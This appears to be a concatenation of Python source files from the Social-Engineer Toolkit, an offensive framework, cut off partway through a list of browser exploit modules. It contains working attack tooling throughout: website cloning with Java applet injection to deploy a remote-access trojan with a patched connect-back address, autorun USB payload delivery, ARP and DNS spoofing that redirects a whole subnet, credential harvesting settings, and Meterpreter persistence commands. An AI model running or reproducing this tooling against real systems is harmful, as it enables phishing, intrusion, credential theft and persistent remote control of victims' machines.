__FILENAME__ = set_config
#!/usr/bin/python

#######################################################################
##                    DO NOT MODIFY THIS FILE                        ##
#######################################################################
#  This file is generated by a routine inside SET, for use by SET.    #
#                                                                     #
#  Settings should be modified in the set_config file, and then       #
#  SET updated using the 'Update SET Configuration' menu item in      #
#  the main menu. This file will be updated with the new settings.    #
#                                                                     #
#  set_config.py generated: 2013-10-30 04:29:41.749820                #
#                                                                     #
#######################################################################
CONFIG_DATE='2013-10-30 04:29:41.749820'
METASPLOIT_PATH="/opt/metasploit/apps/pro/msf3"
METASPLOIT_DATABASE="postgresql"
ENCOUNT=4
AUTO_MIGRATE=False
CUSTOM_EXE="legit.binary"
BACKDOOR_EXECUTION=True
METERPRETER_MULTI_SCRIPT=False
LINUX_METERPRETER_MULTI_SCRIPT=False
METERPRETER_MULTI_COMMANDS="run persistence -r 192.168.1.5 -p 21 -i 300 -X -A;getsystem"
LINUX_METERPRETER_MULTI_COMMANDS="uname;id;cat ~/.ssh/known_hosts"
METASPLOIT_IFRAME_PORT=8080
ETTERCAP=False
ETTERCAP_PATH="/usr/share/ettercap"
ETTERCAP_INTERFACE="eth0"
DSNIFF=False
AUTO_DETECT=False
SENDMAIL=False
EMAIL_PROVIDER="GMAIL"
WEBATTACK_EMAIL=False
TIME_DELAY_EMAIL="1"
MLITM_PORT=80
APACHE_SERVER=False
APACHE_DIRECTORY="/var/www"
WEB_PORT=80
SELF_SIGNED_APPLET=False
JAVA_ID_PARAM="Verified Trusted and Secure (VERIFIED)"
JAVA_REPEATER=False
JAVA_TIME="200"
WEBATTACK_SSL=False
SELF_SIGNED_CERT=False
PEM_CLIENT="/root/newcert.pem"
PEM_SERVER="/root/newreq.pem"
WEBJACKING_TIME=2000
COMMAND_CENTER_INTERFACE="127.0.0.1"
COMMAND_CENTER_PORT=44444
SET_INTERACTIVE_SHELL=True
TERMINAL="SOLO"
DIGITAL_SIGNATURE_STEAL=False
UPX_ENCODE=False
UPX_PATH="/usr/bin/upx"
STAGE_ENCODING=True
AUTO_REDIRECT=True
HARVESTER_REDIRECT=False
HARVESTER_URL="http://thisisasite"
HARVESTER_LOG="/var/www"
HARVESTER_LOG_PASSWORDS="True"
UNC_EMBED=False
ACCESS_POINT_SSID="linksys"
AIRBASE_NG_PATH="/usr/local/sbin/airbase-ng"
DNSSPOOF_PATH="/usr/local/sbin/dnsspoof"
AP_CHANNEL=9
POWERSHELL_INJECTION=True
POWERSHELL_INJECT_PAYLOAD_X86="windows/meterpreter/reverse_tcp"
POWERSHELL_MULTI_INJECTION="True"
POWERSHELL_MULTI_PORTS="22,53,443,21,25"
POWERSHELL_VERBOSE=False
WEB_PROFILER=False
DEPLOY_OSX_LINUX_PAYLOADS="False"
OSX_REVERSE_PORT=8080
LINUX_REVERSE_PORT=8081
OSX_PAYLOAD_DELIVERY="osx/x86/shell_reverse_tcp"
LINUX_PAYLOAD_DELIVERY="linux/x86/meterpreter/reverse_tcp"
CUSTOM_LINUX_OSX_PAYLOAD="False"
ENABLE_PERSISTENCE_OSX="False"
USER_AGENT_STRING="Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
SET_SHELL_STAGER=False
AUTOMATIC_LISTENER=True
METASPLOIT_MODE=True
DEPLOY_BINARIES="YES"
CLEANUP_ENABLED_DEBUG="False"
TRACK_EMAIL_ADDRESSES=False
DNS_SERVER="False"

########NEW FILE########
__FILENAME__ = slim_set
#!/usr/bin/python
import subprocess
#
#
# small script to slim down set
#
#
choice=raw_input("Do you want to slim the size of SET down? This will remove SET interactive payloads and other executables.\nEnter your choice [yes|no]: ")
if choice == "y" or choice == "yes":
    if os.path.isfile("src/payloads/set_payloads/set.payload"):
        path = "src/payloads/set_payloads/"
    if os.path.isfile("../src/payloads/set_payloads/set.payload"):
        path = "../src/payloads/set_payloads/"
    subprocess.Popen("rm -rf %s/* 1> /dev/null 2> /dev/null" % (path), shell=True).wait()
    print "Done. Be sure to change the set_config to SET_PAYLOADS=OFF"

########NEW FILE########
__FILENAME__ = update_config
#!/usr/bin/python

"""
update_config.py:

    This module converts the user-editable set_config text file
    into a python module file. This allows the user to edit
    the configuration with easily understandable values such
    as "ON" or "OFF", but yet SET operates with a module from
    which variables can be imported and boolean values operated
    upon.
"""
import os
from src.core.setcore import print_status, print_info, print_error, return_continue
import datetime
from time import sleep

definepath = os.getcwd()

# TODO
# * integers should not have quotes
# * paths should be double-quoted
# * Booleans should not be quoted

def value_type(value):

    """ Determines whether the setting parameter should be quoted. """

    return {
            'METASPLOIT_PATH':True,
            'METASPLOIT_DATABASE':True,
            'ENCOUNT':False,
            'AUTO_MIGRATE':False,
            'CUSTOM_EXE':True,
            'BACKDOOR_EXECUTION':False,
            'METERPRETER_MULTI_SCRIPT':False,
            'LINUX_METERPRETER_MULTI_SCRIPT':False,
            'METERPRETER_MULTI_COMMANDS':True,
            'LINUX_METERPRETER_MULTI_COMMANDS':True,
            'METASPLOIT_IFRAME_PORT':False,
            'ETTERCAP':False,
            'ETTERCAP_PATH':True,
            'ETTERCAP_DSNIFF_INTERFACE':True,
            'DSNIFF':False,
            'AUTO_DETECT':False,
            'SENDMAIL':False,
            'EMAIL_PROVIDER':True,
            'WEBATTACK_EMAIL':False,
            'APACHE_SERVER':False,
            'APACHE_DIRECTORY':True,
            'WEB_PORT':False,
            'JAVA_ID_PARAM':True,
            'JAVA_REPEATER':False,
            'JAVA_TIME':True,
            'WEBATTACK_SSL':False,
            'SELF_SIGNED_CERT':False,
            'PEM_CLIENT':True,
            'PEM_SERVER':True,
            'WEBJACKING_TIME':False,
            'COMMAND_CENTER_INTERFACE':True,
            'COMMAND_CENTER_PORT':False,
            'SET_INTERACTIVE_SHELL':False,
            'TERMINAL':True,
            'DIGITAL_SIGNATURE_STEAL':False,
            'UPX_ENCODE':False,
            'UPX_PATH':True,
            'AUTO_REDIRECT':False,
            'HARVESTER_REDIRECT':False,
            'HARVESTER_URL':True,
            'UNC_EMBED':False,
            'ACCESS_POINT_SSID':True,
            'AIRBASE_NG_PATH':True,
            'DNSSPOOF_PATH':True,
            'AP_CHANNEL':False,
            'POWERSHELL_INJECTION':False,
            'POWERSHELL_VERBOSE':False,
            'WEB_PROFILER':False,
            'OSX_REVERSE_PORT':False,
            'LINUX_REVERSE_PORT':False,
            'USER_AGENT_STRING':True,
            'SET_SHELL_STAGER':False,
            'AUTOMATIC_LISTENER':False,
            'METASPLOIT_MODE':False,
            'HARVESTER_LOG':True,
            'STAGE_ENCODING':False,
            'TRACK_EMAIL_ADDRESSES':False
           }.get(value,"ERROR")

def update_config():

    init_file = file("%s/config/set_config" % (definepath), "r")
    new_config = file("%s/config/set_config.py" % (definepath), "w")
    timestamp = str(datetime.datetime.now())

    new_config.write("""#!/usr/bin/python\n
#######################################################################
##                    DO NOT MODIFY THIS FILE                        ##
#######################################################################
#  This file is generated by a routine inside SET, for use by SET.    #
#                                                                     #
#  Settings should be modified in the set_config file, and then       #
#  SET updated using the 'Update SET Configuration' menu item in      #
#  the main menu. This file will be updated with the new settings.    #
#                                                                     #
#  set_config.py generated: """ + timestamp + """                #
#                                                                     #
#######################################################################
CONFIG_DATE='"""+timestamp+"""'\n""")
    for line in init_file:
        if not line.startswith("#"):
            line = line.rstrip()
            line = line.split("=")
            setting = line[0]
            value = line[1]
            if value == "ON":
                value = "True"
            elif value == "OFF":
                value = "False"
            else:
                pass

            quoted = value_type(setting)

            if quoted:
                new_config.write(setting + '="' + value + '"\n')
            else:
                new_config.write(setting + '=' + value + '\n')

    init_file.close()
    new_config.close()
    sleep(1)
    from set_config import CONFIG_DATE as verify
    print_info("New set_config.py file generated on: %s" % timestamp)
    print_info("Verifying configuration update...")
    if verify == timestamp:
        print_status("Update verified, config timestamp is: %s" % timestamp)
    else:
        print_error("Update failed? Timestamp on config file is: %s" % verify)
    print_status("SET is using the new config, no need to restart")
    # return_continue()

if __name__ == "__main__":
    update_config()

########NEW FILE########
__FILENAME__ = ratte_module
#!/usr/bin/env python
#
# These are required fields
#
import sys
import subprocess
import os
from src.core.menu import text
from src.core import setcore as core
from time import sleep
import urlparse

definepath = os.getcwd()
setdir = setdir()

MAIN=" RATTE Java Applet Attack (Remote Administration Tool Tommy Edition) - Read the readme/RATTE_README.txt first"

#This is RATTE (Remote Administration Tool Tommy Edition) attack module. It will launch a java applet attack to inject RATTE. Then it will launch RATTE-Server and wait for victim to connect. RATTE can beat local Firewalls, IDS and even EAL 4+ certified network firewalls.
#This release one is only for education!"
AUTHOR="   Thomas Werth"

httpd=None

#
# This will start a web server in the directory root you specify, so for example
# you clone a website then run it in that web server, it will pull any index.html file
#
def start_web_server_tw(directory,port):

    global httpd
    try:
        # import the threading, socketserver, and simplehttpserver
        import thread,SocketServer,SimpleHTTPServer
        # create the httpd handler for the simplehttpserver
        # we set the allow_reuse_address incase something hangs can still bind to port
        class ReusableTCPServer(SocketServer.TCPServer): allow_reuse_address=True
        # specify the httpd service on 0.0.0.0 (all interfaces) on port 80
        httpd = ReusableTCPServer(("0.0.0.0", port),SimpleHTTPServer.SimpleHTTPRequestHandler)
        # thread this mofo
        thread.start_new_thread(httpd.serve_forever,())
        # change directory to the path we specify for output path
        os.chdir(directory)

    # handle keyboard interrupts
    except KeyboardInterrupt:
        core.print_info("Exiting the SET web server...")
        httpd.socket.close()

    # handle the rest
    #except Exception:
    #    print "[*] Exiting the SET web server...\n"
    #    httpd.socket.close()

def stop_web_server_tw():
    global httpd
    try:
        httpd.socket.close()
    # handle the exception
    except Exception:
        httpd.socket.close()

#
# This will create the java applet attack from start to finish.
# Includes payload (reverse_meterpreter for now) cloning website
# and additional capabilities.
#
def java_applet_attack_tw(website,port,directory,ipaddr):

    # clone the website and inject java applet
    core.site_cloner(website,directory,"java")

    ############################################
    # use customized Ratte nehmen
    ############################################

    # this part is needed to rename the msf.exe file to a randomly generated one
    if os.path.isfile("%s/rand_gen" % (setdir)):
        # open the file
        fileopen=file("%s/rand_gen" % (setdir), "r")
        # start a loop
        for line in fileopen:
            # define executable name and rename it
            filename=line.rstrip()
            # move the file to the specified directory and filename
            subprocess.Popen("cp src/payloads/ratte/ratte.binary %s/%s 1> /dev/null 2> /dev/null" % (directory,filename), shell=True).wait()


    # lastly we need to copy over the signed applet
    subprocess.Popen("cp %s/Signed_Update.jar %s 1> /dev/null 2> /dev/null" % (setdir,directory), shell=True).wait()

    #TODO index.html parsen und IPADDR:Port ersetzen
    fileopen=open("%s/index.html" % (directory), "rb")
    data=fileopen.read()
    fileopen.close()

    filewrite=open("%s/index.html" % (directory), "wb")

    toReplace=core.grab_ipaddress()+":80"

    #replace 3 times
    filewrite.write(data.replace(str(toReplace), ipaddr+":"+str(port), 3) )
    filewrite.close()

    # start the web server by running it in the background
    start_web_server_tw(directory,port)

#
# Start ratteserver
#
def ratte_listener_start(port):


    # launch ratteserver    using ../ cause of reports/ subdir
    #subprocess.Popen("%s/src/set_payloads/ratte/ratteserver %d" % (os.getcwd(),port), shell=True).wait()
    subprocess.Popen("../src/payloads/ratte/ratteserver %d" % (port), shell=True).wait()

def prepare_ratte(ipaddr,ratteport, persistent,customexe):

    core.print_status("preparing RATTE...")
    # replace ipaddress with one that we need for reverse connection back
    ############
    #Load content of RATTE
    ############
    fileopen=open("src/payloads/ratte/ratte.binary" , "rb")
    data=fileopen.read()
    fileopen.close()

    ############
    #PATCH Server IP into RATTE
    ############
    filewrite=open("%s/ratteM.exe" % (setdir), "wb")

    host=int(len(ipaddr)+1) * "X"
    rPort=int(len(str(ratteport))+1) * "Y"
    pers=int(len(str(persistent))+1) * "Z"
    #check ob cexe > 0, sonst wird ein Feld gepatcht (falsch!)
    if len(str(customexe)) > 0:
        cexe=int(len(str(customexe))+1) * "Q"
    else:
        cexe=""

    filewrite.write(data.replace(str(cexe), customexe+"\x00", 1).replace(str(pers), persistent+"\x00", 1).replace(str(host), ipaddr+"\x00", 1).replace(str(rPort), str(ratteport)+"\x00", 1) )
    filewrite.close()

# def main(): header is required
def main():
    valid_site = False
    valid_ip = False
    valid_persistence = False
    input_counter= 0
    site_input_counter=0

    #pause=raw_input("This module has finished completing. Press <enter> to continue")

    # Get a *VALID* website address
    while valid_site != True and site_input_counter < 3:
        website = raw_input(core.setprompt(["9", "2"], "Enter website to clone (ex. https://gmail.com)"))
        site = urlparse.urlparse(website)

        if site.scheme == "http" or site.scheme == "https":
            if site.netloc != "":
                valid_site = True
            else:
                if site_input_counter == 2:
                    core.print_error("\nMaybe you have the address written down wrong?" + core.bcolors.ENDC)
                    sleep(4)
                    return
                else:
                    core.print_warning("I can't determine the fqdn or IP of the site. Try again?")
                    site_input_counter += 1
        else:
            if site_input_counter == 2:
                core.print_error("\nMaybe you have the address written down wrong?")
                sleep(4)
                return
            else:
                core.print_warning("I couldn't determine whether this is an http or https site. Try again?")
                site_input_counter +=1
        #core.DebugInfo("site.scheme is: %s " % site.scheme)
        #core.DebugInfo("site.netloc is: %s " % site.netloc)
        #core.DebugInfo("site.path is: %s " % site.path)
        #core.DebugInfo("site.params are: %s " % site.params)
        #core.DebugInfo("site.query is: %s " % site.query)
        #core.DebugInfo("site.fragment is: %s " % site.fragment)

    while valid_ip != True and input_counter < 3:
        ipaddr = raw_input(core.setprompt(["9", "2"], "Enter the IP address to connect back on"))
        valid_ip = core.validate_ip(ipaddr)
        if not valid_ip:
            if input_counter == 2:
                core.print_error("\nMaybe you have the address written down wrong?")
                sleep(4)
                return
            else:
                input_counter += 1

    #javaport must be 80, cause applet uses in web injection port 80 to download payload!
    try:
        javaport = int(raw_input(core.setprompt(["9", "2"], "Port Java applet should listen on [80]")))
        while javaport == 0 or javaport > 65535:
            if javaport == 0:
                core.print_warning(text.PORT_NOT_ZERO)
            if javaport > 65535:
                core.print_warning(text.PORT_TOO_HIGH)
            javaport = int(raw_input(core.setprompt(["9", "2"],"Port Java applet should listen on [80]")))
    except ValueError:
        #core.print_info("Port set to default of 80")
        javaport = 80
    #javaport=80

    try:
        ratteport = int(raw_input(core.setprompt(["9", "2"], "Port RATTE Server should listen on [8080]")))
        while ratteport == javaport or ratteport == 0 or ratteport > 65535:
            if ratteport == javaport:
                core.print_warning("Port must not be equal to javaport!")
            if ratteport == 0:
                core.print_warning(text.PORT_NOT_ZERO)
            if ratteport > 65535:
                core.print_warning(text.PORT_TOO_HIGH)
            ratteport = int(raw_input(core.setprompt(["9", "2"], "Port RATTE Server should listen on [8080]")))
    except ValueError:
        ratteport = 8080

    persistent = core.yesno_prompt(["9","2"], "Should RATTE be persistentententent [no|yes]?")

# j0fer 06-27-2012 #        while valid_persistence != True:
# j0fer 06-27-2012 #                persistent=raw_input(core.setprompt(["9", "2"], "Should RATTE be persistent [no|yes]?"))
# j0fer 06-27-2012 #                persistent=str.lower(persistent)
# j0fer 06-27-2012 #                if persistent == "no" or persistent == "n":
# j0fer 06-27-2012 #                        persistent="NO"
# j0fer 06-27-2012 #                        valid_persistence = True
# j0fer 06-27-2012 #               elif persistent == "yes" or persistent == "y":
# j0fer 06-27-2012 #                       persistent="YES"
# j0fer 06-27-2012 #                       valid_persistence = True
# j0fer 06-27-2012 #                else:
# j0fer 06-27-2012 #                       core.print_warning(text.YES_NO_RESPONSES)

    customexe=raw_input(core.setprompt(["9", "2"], "Use specifix filename (ex. firefox.exe) [filename.exe or empty]?"))

    #######################################
    # prepare RATTE
    #######################################

    prepare_ratte(ipaddr,ratteport,persistent,customexe)

    ######################################
    # Java Applet Attack to deploy RATTE
    #######################################

    core.print_info("Starting java applet attack...")
    java_applet_attack_tw(website,javaport, "reports/",ipaddr)

    fileopen=file("%s/rand_gen" % (setdir,definepath), "r")
    for line in fileopen:
        ratte_random = line.rstrip()
    subprocess.Popen("cp %s/ratteM.exe %s/reports/%s" % (setdir,definepath,definepath,ratte_random), shell=True).wait()

    #######################
    # start ratteserver
    #######################

    core.print_info("Starting ratteserver...")
    ratte_listener_start(ratteport)

    ######################
    # stop webserver
    ######################
    stop_web_server_tw()
    return

########NEW FILE########
__FILENAME__ = ratte_only_module
#!/usr/bin/env python
#
# These are required fields
#
import sys
import subprocess
import os
from src.core.setcore import *
from time import sleep
from src.core.menu import text

# "This is RATTE (Remote Administration Tool Tommy Edition) prepare module.It will prepare a custom ratteM.exe."
MAIN=" RATTE (Remote Administration Tool Tommy Edition) Create Payload only. Read the readme/RATTE-Readme.txt first"
AUTHOR=" Thomas Werth"

#
# Start ratteserver
#
def ratte_listener_start(port):

    subprocess.Popen("src/payloads/ratte/ratteserver %d" % (port), shell=True).wait()

def prepare_ratte(ipaddr,ratteport, persistent,customexe):

    print_info("preparing RATTE...")
    # replace ipaddress with one that we need for reverse connection back
    ############
    #Load content of RATTE
    ############
    fileopen=open("src/payloads/ratte/ratte.binary" , "rb")
    data=fileopen.read()
    fileopen.close()

    ############
    #PATCH Server IP into RATTE
    ############
    filewrite=open(setdir + "/ratteM.exe", "wb")

    host=int(len(ipaddr)+1) * "X"
    rPort=int(len(str(ratteport))+1) * "Y"
    pers=int(len(str(persistent))+1) * "Z"
    #check ob cexe > 0, sonst wird ein Feld gepatcht (falsch!)
    if len(str(customexe)) > 0:
        cexe=int(len(str(customexe))+1) * "Q"
    else:
        cexe=""

    filewrite.write(data.replace(str(cexe), customexe+"\x00", 1).replace(str(pers), persistent+"\x00", 1).replace(str(host), ipaddr+"\x00", 1).replace(str(rPort), str(ratteport)+"\x00", 1) )

    # filewrite.write(data.replace(str(host), ipaddr+"\x00", 1).replace(str(rPort), str(ratteport)+"\x00", 1) )
    #filewrite.write(data.replace(str(pers), persistent+"\x00", 1).replace(str(host), ipaddr+"\x00", 1).replace(str(rPort), str(ratteport)+"\x00", 1) )
    filewrite.close()

# def main(): header is required
def main():
    valid_site = False
    valid_ip = False
    valid_response = False
    input_counter=0

    #################
    # get User Input
    #################
    #ipaddr=raw_input(setprompt(["9", "2"], "IP address to connect back on"))
    while valid_ip != True and input_counter < 3:
        ipaddr = raw_input(setprompt(["9", "2"], "Enter the IP address to connect back on"))
        valid_ip = validate_ip(ipaddr)
        if not valid_ip:
            if input_counter == 2:
                print_error("\nMaybe you have the address written down wrong?")
                sleep(4)
                return
            else:
                input_counter += 1

    """try:
            ratteport=int(raw_input(setprompt(["9", "2"], "Port RATTE Server should listen on")))
            while ratteport==0 or ratteport > 65535:
                    print_warning('Port must not be equal to javaport!')
                    ratteport=int(raw_input(setprompt(["9", "2"], "Enter port RATTE Server should listen on")))
    except ValueError:
            ratteport=8080"""

    try:
        ratteport = int(raw_input(setprompt(["9", "2"], "Port RATTE Server should listen on [8080]")))
        while ratteport == 0 or ratteport > 65535:
            if ratteport == 0:
                print_warning(text.PORT_NOT_ZERO)
            if ratteport > 65535:
                print_warning(text.PORT_TOO_HIGH)
            ratteport = int(raw_input(setprompt(["9", "2"],"Enter port RATTE Server should listen on [8080]")))
    except ValueError:
        #core.print_info("Port set to default of 8080")
        ratteport = 8080


    """persistent=raw_input(setprompt(["9", "2"], "Should RATTE be persistent [no|yes]?"))
    if persistent == 'no' or persistent == '' or persistent == 'n':
            persistent='NO'
    else:
            persistent='YES'"""

    while valid_response != True:
        persistent=raw_input(setprompt(["9", "2"], "Should RATTE be persistent [no|yes]?"))
        persistent=str.lower(persistent)
        if persistent == "no" or persistent == "n":
            persistent="NO"
            valid_response = True
        elif persistent == "yes" or persistent == "y":
            persistent="YES"
            valid_response = True
        else:
            print_warning(text.YES_NO_RESPONSES)

    valid_response = False

    customexe=raw_input(setprompt(["9", "2"], "Use specifix filename (ex. firefox.exe) [filename.exe or empty]?"))

    ############
    # prepare RATTE
    ############
    prepare_ratte(ipaddr,ratteport,persistent,customexe)

    print_status("Payload has been exported to %s/ratteM.exe" % (setdir))

    ###################
    # start ratteserver
    ###################
    """prompt=raw_input(setprompt(["9", "2"], "Start the ratteserver listener now [yes|no]"))
    if prompt == "yes" or prompt == "" or prompt == "y":
            print_info("Starting ratteserver...")
            ratte_listener_start(ratteport)"""

    while valid_response != True:
        prompt=raw_input(setprompt(["9", "2"], "Start the ratteserver listener now [yes|no]"))
        prompt=str.lower(prompt)
        if prompt == "no" or prompt == "n":
            prompt="NO"
            print_error("Aborting...")
            sleep(2)
            valid_response = True
        elif prompt == "yes" or prompt == "y":
            print_info("Starting ratteserver...")
            ratte_listener_start(ratteport)
            print_info("Stopping ratteserver...")
            sleep(2)
            valid_response = True
        else:
            print_warning("valid responses are 'n|y|N|Y|no|yes|No|Yes|NO|YES'")

########NEW FILE########
__FILENAME__ = autorun
#!/usr/bin/env python
# simple autorun creation for set

import subprocess
import os
import re
import sys
from src.core.setcore import *
from time import sleep

#  [autorun]
#  open=autorun.exe
#  icon=autorun.ico

# define metasploit path
definepath = os.getcwd()
msf_path = meta_path()
me = mod_name()

trigger = 0
if os.path.isfile(setdir + "/standardpayload.file"):
    trigger = 1
    subprocess.Popen("rm -rf autorun/ 1> /dev/null 2> /dev/null;mkdir autorun;cp %s/msf.exe autorun/program.exe 1> /dev/null 2> /dev/null;cp %s/msf.exe autorun/program.exe 1> /dev/null 2>/dev/null" % (setdir,setdir), shell=True).wait()
if os.path.isfile(setdir + "/fileformat.file"):
    trigger = 2
    subprocess.Popen("rm -rf autorun/ 1> /dev/null 2> /dev/null;mkdir autorun;cp %s/template.pdf autorun/ 1> /dev/null 2>/dev/null" % (setdir), shell=True).wait()

if os.path.isfile(setdir + "/dll/openthis.wab"):
    subprocess.Popen("rm -rf autorun/ 1> /dev/null 2> /dev/null;mkdir autorun;cp %s/dll/* autorun/ 1> /dev/null 2> /dev/null" % (setdir), shell=True).wait()
    trigger = 3

filewrite = file("autorun/autorun.inf", "w")

# if we are using shellcodeexec
alpha_data = ""
if os.path.isfile(setdir + "/meterpreter.alpha"):
    fileopen = file(setdir + "/meterpreter.alpha", "r")
    alpha_data = fileopen.read().rstrip()


# if using standard payloads
if trigger == 1:
    payload = "program.exe \"" + alpha_data + "\""

# if using pdf payload
if trigger == 2:
    payload = "template.pdf"

if trigger == 3:
    payload = "openthis.wab"

filewrite.write("""[autorun]
open=%s
icon=autorun.ico""" % (payload))
filewrite.close()
print_status("Your attack has been created in the SET home directory folder 'autorun'")
print_status("Note a backup copy of template.pdf is also in /root/.set/template.pdf if needed.")
print_info("Copy the contents of the folder to a CD/DVD/USB to autorun")

# if we are doing the custom pdf
if trigger == 2 or trigger == 3:
# j0fer 06-27-2012 #   choice1 = raw_input(setprompt("0", "Create a listener right now [yes|no]"))
    choice1 = yesno_prompt("0", "Create a listener right now [yes|no]")
# j0fer 06-27-2012 #    if choice1 == "yes" or choice1 == "y" or choice1 == "":
    if choice1 == "YES":
        filewrite = file(setdir + "/meta_config", "w")
        fileopen = file(setdir + "/payload.options", "r")
        for line in fileopen:
            line = line.split(" ")
            filewrite.write("use multi/handler\n")
            filewrite.write("set payload " + line[0] + "\n")
            filewrite.write("set lhost " + line[1] + "\n")
            filewrite.write("set lport " + line[2] + "\n")
            filewrite.write("set ExitOnSession false\n")
            filewrite.write("exploit -j")
            filewrite.close()
        subprocess.Popen("ruby %s/msfconsole -L -r %s/meta_config" % (msf_path, setdir), shell=True).wait()
    else:
        print_warning("cancelling...")
        sleep (2)

########NEW FILE########
__FILENAME__ = arp
import subprocess
import re
import pexpect
import os
import time
import sys
from src.core.setcore import *

# Define to use ettercap or dsniff or nothing.
#
# Thanks to sami8007 and trcx for the dsniff addition

definepath=os.getcwd()

# grab config file
config=file("config/set_config", "r").readlines()
# grab our default directory
cwd=os.getcwd()
# set a variable as default to n or no
ettercapchoice= 'n'
# add dsniffchoice
dsniffchoice = 'n'
for line in config:
    # check for ettercap choice here
    match1=re.search("ETTERCAP=ON",line)
    if match1:
        print_info("ARP Cache Poisoning is set to " + bcolors.GREEN + "ON" + bcolors.ENDC)
        ettercapchoice='y'

    # check for dsniff choice here
    match2=re.search("DSNIFF=ON", line)
    if match2:
        print_info("DSNIFF DNS Poisoning is set to " + bcolors.GREEN + "ON" + bcolors.ENDC)
        dsniffchoice = 'y'
        ettercapchoice = 'n'

# GRAB CONFIG from SET
fileopen=file("config/set_config", "r").readlines()
for line in fileopen:
    # grab the ettercap interface
    match=re.search("ETTERCAP_INTERFACE=", line)
    if match:
        line=line.rstrip()
        interface=line.split("=")
        interface=interface[1]
        if interface == "NONE":
            interface=""

    # grab the ettercap path
    etterpath=re.search("ETTERCAP_PATH=", line)
    if etterpath:
        line=line.rstrip()
        path=line.replace("ETTERCAP_PATH=", "")

        if not os.path.isfile(path):
            path = ("/usr/local/share/ettercap")

# if we are using ettercap then get everything ready
if ettercapchoice== 'y':

    # grab ipaddr
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input(setprompt("0", "IP address to connect back on: "))
        update_options("IPADDR=" + ipaddr)

    if ettercapchoice == 'y':
        try:
            print """
  This attack will poison all victims on your local subnet, and redirect them
  when they hit a specific website. The next prompt will ask you which site you
  will want to trigger the DNS redirect on. A simple example of this is if you
  wanted to trigger everyone on your subnet to connect to you when they go to
  browse to www.google.com, the victim would then be redirected to your malicious
  site. You can alternatively poison everyone and everysite by using the wildcard
  '*' flag.

  IF YOU WANT TO POISON ALL DNS ENTRIES (DEFAULT) JUST HIT ENTER OR *
"""
            print_info("Example: http://www.google.com")
            dns_spoof=raw_input(setprompt("0", "Site to redirect to attack machine [*]"))
            os.chdir(path)
            # small fix for default
            if dns_spoof == "":
            # set default to * (everything)
                dns_spoof="*"
            # remove old stale files
            subprocess.Popen("rm etter.dns 1> /dev/null 2> /dev/null", shell=True).wait()
            # prep etter.dns for writing
            filewrite=file("etter.dns", "w")
            # send our information to etter.dns
            filewrite.write("%s A %s" % (dns_spoof,ipaddr))
            # close the file
            filewrite.close()
            # set bridge variable to nothing
            bridge=""
            # assign -M arp to arp variable
            arp="-M arp"
            print_error("LAUNCHING ETTERCAP DNS_SPOOF ATTACK!")
            # spawn a child process
            os.chdir(cwd)
            time.sleep(5)
            filewrite=file(setdir + "/ettercap","w")
            filewrite.write("ettercap -T -q -i %s -P dns_spoof %s %s // //" % (interface,arp,bridge))
            filewrite.close()
            os.chdir(cwd)
        except Exception, error:
            os.chdir(cwd)
            #log(error)
            print_error("ERROR:An error has occured:")
            print "ERROR:" +str(error)

# if we are using dsniff
if dsniffchoice == 'y':

    # grab ipaddr
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input(setprompt("0", "IP address to connect back on: "))
        update_options("IPADDR=" + ipaddr)

    if dsniffchoice == 'y':
        try:
            print """
  This attack will poison all victims on your local subnet, and redirect them
  when they hit a specific website. The next prompt will ask you which site you
  will want to trigger the DNS redirect on. A simple example of this is if you
  wanted to trigger everyone on your subnet to connect to you when they go to
  browse to www.google.com, the victim would then be redirected to your malicious
  site. You can alternatively poison everyone and everysite by using the wildcard
  '*' flag.

  IF YOU WANT TO POISON ALL DNS ENTRIES (DEFAULT) JUST HIT ENTER OR *
"""
            print_info("Example: http://www.google.com")
            dns_spoof=raw_input(setprompt("0", "Site to redirect to attack machine [*]"))
            #os.chdir(path)
            # small fix for default
            if dns_spoof == "":
                dns_spoof="*"
            subprocess.Popen("rm %s/dnsspoof.conf 1> /dev/null 2> /dev/null" % (setdir), shell=True).wait()
            filewrite=file(setdir + "/dnsspoof.conf", "w")
            filewrite.write("%s %s" % (ipaddr, dns_spoof))
            filewrite.close()
            print_error("LAUNCHING DNSSPOOF DNS_SPOOF ATTACK!")
            # spawn a child process
            os.chdir(cwd)
            # time.sleep(5)
            # grab default gateway, should eventually replace with pynetinfo python module
            gateway = subprocess.Popen("netstat -rn|grep %s|awk '{print $2}'| awk 'NR==2'" % (interface), shell=True, stdout=subprocess.PIPE).communicate()[0]
            # open file for writing
            filewrite=file(setdir + "/ettercap","w")
            # write the arpspoof / dnsspoof commands to file
            filewrite.write("arpspoof %s | dnsspoof -f %s/dnsspoof.conf" % (gateway,setdir))
            # close the file
            filewrite.close()
            # change back to normal directory
            os.chdir(cwd)
            # this is needed to keep it similar to format above for web gui mode
            pause=raw_input("Press <return> to begin dsniff.")
        except Exception, error:
            os.chdir(cwd)
            #log(error)
            # print error message
            print_error("ERROR:An error has occurred:")
            print bcolors.RED + "ERROR" + str(error) + bcolors.ENDC

########NEW FILE########
__FILENAME__ = dictionaries
#!/usr/bin/env python
""" Python lists used for quick conversion of user input
    to strings used by the toolkit

    """

def encoder_type(encode):
    """
    Takes the value sent from the user encoding menu and returns
    the actual value to be used.

    """

    return {
            '0':"",
            '1':"shikata_ga_nai",
            '2':"",
            '3':"MULTIENCODE",
            '4':"BACKDOOR",
            }.get(encode,"ERROR")


def ms_module(exploit):
    """ Receives the input given by the user from gen_payload.py """

    return {
            '1':"exploit/windows/browser/ms14_012_cmarkup_uaf",
            '2':"exploit/windows/browser/ms14_012_textrange",
            '1':"exploit/windows/browser/ms13_080_cdisplaypointer",
            '2':"exploit/windows/browser/ie_setmousecapture_uaf",
            '3':"exploit/multi/browser/java_jre17_jmxbean_2",
            '4':"exploit/multi/browser/java_jre17_jmxbean",
            '5':"exploit/windows/browser/ms13_009_ie_slayoutrun_uaf",
            '6':"exploit/windows/browser/ie_cbutton_uaf",
            '7':"exploit/multi/browser/java_jre17_exec",
            '8':"exploit/windows/browser/ie_execcommand_uaf",
            '9':"exploit/multi/browser/java_atomicreferencearray",
            '10':"exploit/multi/browser/java_verifier_field_access",
            '11':"exploit/windows/browser/ms12_037_same_id",
            '12':"exploit/windows/browser/msxml_get_definition_code_exec",
            '13':"exploit/windows/browser/adobe_flash_rtmp",
            '14':"exploit/windows/browser/adobe_flash_mp4_cprt",
            '15':"exploit/windows/browser/ms12_004_midi",
